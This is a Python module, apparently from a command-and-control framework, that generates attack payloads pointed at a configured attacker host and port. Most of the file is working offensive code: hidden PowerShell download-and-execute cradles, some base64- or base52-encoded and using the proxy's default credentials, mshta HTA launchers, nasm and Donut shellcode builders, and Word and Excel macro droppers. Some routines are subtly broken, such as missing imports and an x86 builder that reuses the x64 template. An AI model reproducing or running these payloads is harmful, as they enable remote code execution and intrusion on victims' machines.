from os import mkdir, system, popen
from rich.console import Console

from core import config
from core.config import *

console = Console()

"""Create a Directory for forged payloads"""
try:
    mkdir("./utils/payloads")
    mkdir("./utils/payloads/shellcodes")
    mkdir("./utils/payloads/Macros")
    mkdir("./utils/payloads/Executables")
    mkdir("./utils/payloads/Powershell")
    mkdir("./utils/payloads/Webserver")
except FileExistsError:
    pass


def hta_paylods():
    config.PAYLOADS.append("\n[bold italic blue][-] HTA-Payloads[/ bold italic blue]")
    if SSL:
        """Appending payloads"""
        config.PAYLOADS.append(f'[bold red]->[/bold red] mshta https://{config.HOST}:{config.PORT}{config.hta_payload}')
        config.PAYLOADS.append(f'[bold red]->[/bold red] powershell -c \"mshta https://{config.HOST}:{config.PORT}{config.hta_payload}\"')

    else:
        """Appending payloads"""
        config.PAYLOADS.append(f'[bold red]->[/bold red] mshta http://{config.HOST}:{config.PORT}{config.hta_payload}')
        config.PAYLOADS.append(f'[bold red]->[/bold red] powershell -c \"mshta http://{config.HOST}:{config.PORT}{config.hta_payload}\"')

    console.log("[green][+] Created HTA-Payload[/green]")

def pwsh_job():
    commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))}"
    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{raw}');IEX($s)"
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}", raw_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}", raw_payload).replace("{HTTP}", "http")

    payload = base64.b64encode(bytearray(payload, "UTF-8"))
    JOB = commandJ.replace('{payload}', payload.decode("UTF-8"))
    PROCESS = commandP.replace('{payload}', payload.decode("UTF-8"))

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Job[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {JOB}")
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Process[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {PROCESS}")

    console.log("[green][+] Created Powershell Start-Job & Start-Process [/green]")


def pwsh_file():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjf}');IEX($s)"
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjf}",hjf_payload).replace("{HTTP}", "http")
    payload = base64.b64encode(bytearray(payload, "UTF-8"))
    FILE = commandF.replace('{payload}', payload.decode("UTF-8"))

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell File[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {FILE}")

    console.log("[green][+] Created Powershell File[/green]")


def pwsh_sct():
    commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{payload}')))"
    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{hjfs}');IEX($s)"
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{hjfs}",hjfs_payload).replace("{HTTP}", "http")
    payload = base64.b64encode(bytearray(payload, "UTF-8"))
    SCT = commandF.replace('{payload}', payload.decode("UTF-8"))

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell SCT[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {SCT}")

    console.log("[green][+] Created Powershell SCT[/green]")


def simple_payloads():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{raw}');\""""
    payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}", raw_payload)
    payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}", raw_payload)
    payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}", raw_payload)
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Misc[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")

    console.log("[green][+] Created Simple Powershell Payloads[/green]")


def pwsh_base64():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b64stager}');\""""
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b64stager}", b64_stager).replace("{HTTP}", "http")

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Base64[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")

    console.log("[green][+] Created Powershell Base64[/green]")


def pwsh_base52():
    payload = """powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');Invoke-Expression $h;\""""
    payload2 = """powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    payload3 = """powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('{HTTP}://{ip}:{port}{b52stager}');\""""
    payload4 = """powershell -w hidden $s=(new-object net.webclient).DownloadString('{HTTP}://{ip}:{port}{b52payload}');$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"""
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
        payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")
        payload2 = payload2.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")
        payload3 = payload3.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")
        payload4 = payload4.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52payload}",b52_payload).replace("{HTTP}", "http")

    """Appending payloads"""
    config.PAYLOADS.append("\n[bold italic blue][-] Powershell Base54[/ bold italic blue]")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload2}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload3}")
    config.PAYLOADS.append(f"[bold red]->[/bold red] {payload4}")

    console.log("[green][+] Created Powershell Base52[/green]")


def cmd_shellcodex64():
    f = open("core/agents/cmd_shellcodex64.ninja", "r")
    payload = f.read()
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")

    out = open("utils/payloads/shellcodes/cmd_shellcodex64.asm", "w")
    out.write(payload)
    out.close()
    try:
        compile = "nasm -f win64 utils/payloads/shellcodes/cmd_shellcodex64.asm -o utils/payloads/shellcodes/cmd_shellcodex64.bin"
        shellcode = """for i in $(objdump -d utils/payloads/shellcodes/cmd_shellcodex64.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
        system(compile)
        sc = popen(shellcode).read().strip("\n")
        final_payload = f"unsigned char sc[] = {sc}"
        compiled = open("utils/payloads/shellcodes/cmd_shellcodex64", "w")
        compiled.write(final_payload)
        compiled.close()
        console.log("[green][+] Cmd Shellcodex64 written to:[/green]  [magenta]utils/payloads/shellcodes/cmd_shellcodex64[/magenta]")
    except:
        """Auto install NASM?"""
        console.log("[!] Please check if nasm is installed", style="red")


def cmd_shellcodex86():
    f = open("core/agents/cmd_shellcodex64.ninja", "r")
    payload = f.read()
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{b52stager}",b52_stager).replace("{HTTP}", "http")

    out = open("utils/payloads/shellcodes/cmd_shellcodex86.asm", "w")
    out.write(payload)
    out.close()
    try:
        compile_nasm_command = "nasm -f win64 utils/payloads/shellcodes/cmd_shellcodex86.asm -o utils/payloads/shellcodes/cmd_shellcodex86.bin"
        extract_shellcode_command = """for i in $(objdump -d utils/payloads/shellcodes/cmd_shellcodex86.bin |grep "^ " |cut -f2); do echo -n '\\x'$i; done;echo"""
        system(compile_nasm_command)
        sc = popen(extract_shellcode_command).read().strip("\n")
        final_payload = f"unsigned char sc[] = {sc}"
        compiled = open("utils/payloads/shellcodes/cmd_shellcodex86", "w")
        compiled.write(final_payload)
        compiled.close()
        console.log("[green][+] Cmd Shellcodex86 written to:[/green]  [magenta]utils/payloads/shellcodes/cmd_shellcodex86[/magenta]")
    except:
        console.log("[!] Please check if nasm is installed", style="red")


def donut_shellcode():
    try:
        shellcode = donut.create(file="utils/payloads/Executables/dropper_cs.exe")
        b64 = base64.b64encode(shellcode).decode("utf-8")
        out = open("utils/payloads/shellcodes/donut_shellcode.b64", "w")
        out.write(b64)
        out.close()
        console.log("[green][+] Donut Shellcode written to:[/green]  [magenta]utils/payloads/shellcodes/donut_shellcode.b64[/magenta]")
    except:
        console.log("[!] Make sure donut 0.9.2 installed : pip3 install 'donut-shellcode==0.9.2' ", style="red")



def word_macro():
    f = open("core/agents/word_macro.ninja", "r")
    payload = f.read()
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "http")

    out = open("utils/payloads/Macros/Word_macro.vba", "w")
    out.write(payload)
    out.close()
    console.log("[green][+] Word Macro written to:[/green]  [magenta]utils/payloads/Macros/Word_macro.vba[/magenta]")


def excel_macro():
    f = open("core/agents/Excel_macro.ninja", "r")
    payload = f.read()
    if SSL:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "https")
    else:
        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw_payload}",raw_payload).replace("{HTTP}", "http")

    out = open("utils/payloads/Macros/Excel_macro.vba", "w")
    out.write(payload)
    out.close()
    console.log("[green][+] Excel Macro written to:[/green]  [magenta]utils/payloads/Macros/Excel_macro.vba[/magenta]")



def Create_Payloads():
    try:
        hta_paylods()
        pwsh_job()
        pwsh_file()
        pwsh_sct()
        simple_payloads()
        pwsh_base64()
        pwsh_base52()
        cmd_shellcodex86()
        cmd_shellcodex64()
        word_macro()
        excel_macro()
        if not config.Donut:
            console.log("[!] Donut is Disabled so if you want to use it, kindly create a new campaign", style="bold red")
        else:
            try:
                donut_shellcode()
                config.migrator()
            except:
                console.print_exception()
        """Appending the shellcodes path to list"""
        config.PAYLOADS.append("\n[bold italic blue][-] Macros and Shellcodes [/ bold italic blue]")
        config.PAYLOADS.append("[bold red]->[/bold red] view file://./payloads")
    except:
        console.print_exception()
